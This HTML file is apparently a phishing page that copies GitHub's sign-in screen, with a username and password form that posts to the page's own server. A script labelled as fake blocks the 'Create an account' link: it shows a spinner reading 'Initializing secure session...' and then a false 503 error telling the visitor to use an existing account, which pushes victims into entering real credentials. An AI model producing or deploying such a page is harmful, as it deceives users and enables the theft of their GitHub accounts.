<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta 
  name="viewport" 
  content="width=device-width, initial-scale=1.0"
>
<title>
  Sign in to GitHub · GitHub
</title>
<script src="https://cdn.tailwindcss.com">
</script>
<style>
body { 
  background-color: #f6f8fa; 
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; 
}
.card-v {
  background-color: #ffffff;
  border: 1px solid #d0d7de;
  border-radius: 6px;
  padding: 20px;
  width: 100%;
  max-width: 308px;
  box-shadow: 0 1px 0 rgba(27,31,36,0.04);
}
.input-v {
  width: 100%;
  padding: 5px 12px;
  font-size: 14px;
  line-height: 20px;
  color: #1f2328;
  vertical-align: middle;
  background-color: #f6f8fa;
  border: 1px solid #d0d7de;
  border-radius: 6px;
  outline: none;
}
.input-v:focus {
  border-color: #0969da;
  box-shadow: 0 0 0 3px rgba(9,105,218,0.3);
}
.btn-v {
  position: relative;
  display: inline-block;
  padding: 5px 16px;
  font-size: 14px;
  font-weight: 600;
  line-height: 20px;
  white-space: nowrap;
  vertical-align: middle;
  cursor: pointer;
  user-select: none;
  border: 1px solid rgba(27,31,36,0.15);
  border-radius: 6px;
  appearance: none;
  background-color: #2da44e;
  color: #ffffff;
  width: 100%;
}
.btn-v:hover {
  background-color: #2c974b;
}
#reg-overlay {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: #f6f8fa;
  z-index: 999;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}
</style>
</head>
<body class="flex flex-col items-center pt-10">
<div class="mb-6">
  <svg 
    height="48" 
    viewBox="0 0 16 16" 
    width="48" 
    fill="#24292f"
  >
    <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
    </path>
  </svg>
</div>
<h1 class="text-2xl font-light mb-4">
  Sign in to GitHub
</h1>
<div class="card-v">
  <form 
    action="" 
    method="POST"
  >
    <div class="mb-4">
      <label class="block text-sm mb-2 text-[#1f2328]">
        Username or email address
      </label>
      <input 
        name="user" 
        type="text" 
        class="input-v" 
        required
      >
    </div>
    <div class="mb-4">
      <div class="flex justify-between mb-2">
        <label class="text-sm text-[#1f2328]">
          Password
        </label>
        <a 
          href="#" 
          class="text-[#0969da] text-xs hover:underline"
        >
          Forgot password?
        </a>
      </div>
      <input 
        name="pass" 
        type="password" 
        class="input-v" 
        required
      >
    </div>
    <button 
      type="submit" 
      class="btn-v"
    >
      Sign in
    </button>
  </form>
</div>
<div class="mt-4 card-v text-center text-sm py-4">
  New to GitHub? 
  <span 
    class="text-[#0969da] cursor-pointer hover:underline" 
    onclick="fakeGhReg()"
  >
    Create an account
  </span>.
</div>
<!-- FAKE LOADING OVERLAY -->
<div id="reg-overlay">
  <div 
    class="animate-spin rounded-full h-8 w-8 border-b-2 border-[#24292f] mb-4"
  >
  </div>
  <p class="text-sm text-gray-600">
    Initializing secure session...
  </p>
</div>
<script>
function fakeGhReg() {
  const overlay = document.getElementById('reg-overlay');
  overlay.style.display = 'flex';
  setTimeout(() => {
    overlay.style.display = 'none';
    alert("Error 503: GitHub signup is currently unavailable for your IP range. Please use an existing account.");
    // REDIRECT BACK TO LOGIN ROUTE
    window.location.href = window.location.pathname;
  }, 3000);
}
</script>
</body>
</html>
